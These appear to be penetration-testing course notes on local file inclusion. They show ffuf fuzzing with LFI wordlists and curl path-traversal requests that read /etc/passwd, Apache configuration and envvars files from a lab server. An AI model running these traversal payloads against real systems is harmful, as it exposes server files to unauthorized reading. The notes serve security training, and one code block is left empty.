**Fuzzing Parameters**
- The HTML forms users can use on the web application front-end tend to be properly tested and well secured against different web attacks. 

**Using ffuf to Fuzz Common GET Parameters**

```

**Tip:** For a more precise scan, we can limit our scan to the most popular LFI parameters found on this [link](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters).

### LFI Wordlists
- So far we have crafted our own LFI Payloads with ../../../etc/passwd and so on. However we can automate this process using wordlists that we can download. 
-  There are a number of [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) we can use for this scan. A good wordlist is [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), as it contains various bypasses and common files, so it makes it easy to run several tests at once. We can use this wordlist to fuzz the `?language=` parameter we have been testing throughout the module, as follows:

```shell-session
realCustampin@htb[/htb]$ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

...SNIP...

 :: Follow redirects : false

### Fuzzing Server Files

**Server WebRoot Directory**
- We can fuzz for the server webroot directory using the following command:

```shell-session
realCustampin@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

...SNIP...

: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287

/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
```

**Server Logs/Configurations**
- As seen in previous sections, we have used the Log and Configuration Files to execute commands on the server, we can use ffuf to fuzz for those files and directories using wordlists as well. 


To do so, we may also use the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, as it contains many of the server logs and configuration paths we may be interested in. If we wanted a more precise scan, we can use this [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows), though they are not part of `seclists`, so we need to download them first. Let's try the Linux wordlist against our LFI vulnerability, and see what we get:

```shell-session
realCustampin@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ
 :: Wordlist         : FUZZ: ./LFI-WordList-Linux
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287

```
- As you can see we get a bunch of comebacks for good files that are on the server. Let's see if we can read any to gain more information about the server .

```shell-session
realCustampin@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf

...SNIP...
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
...SNIP...
```

As we can see, we do get the default webroot path and the log path. However, in this case, the log path is using a global apache variable (`APACHE_LOG_DIR`), which are found in another file we saw above, which is (`/etc/apache2/envvars`), and we can read it to find the variable values:

```shell-session
realCustampin@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars

...SNIP...
export APACHE_RUN_USER=www-data
export APACHE_RUN_GROUP=www-data
# temporary state file location. This might be changed to /run in Wheezy+1
export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
...SNIP...
```

As we can see, the (`APACHE_LOG_DIR`) variable is set to (`/var/log/apache2`), and the previous configuration told us that the log files are `/access.log` and `/error.log`, which have accessed in the previous section.

### LFI Tools 
- We can utilize a number of LFI tools to automate much of the process we have been learning, which may save time in some cases, but may also miss many vulnerabilities and files we may otherwise identify through manual testing. 
- The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy). We can also search GitHub for various other LFI tools and scripts, but in general, most tools perform the same tasks, with varying levels of success and accuracy.
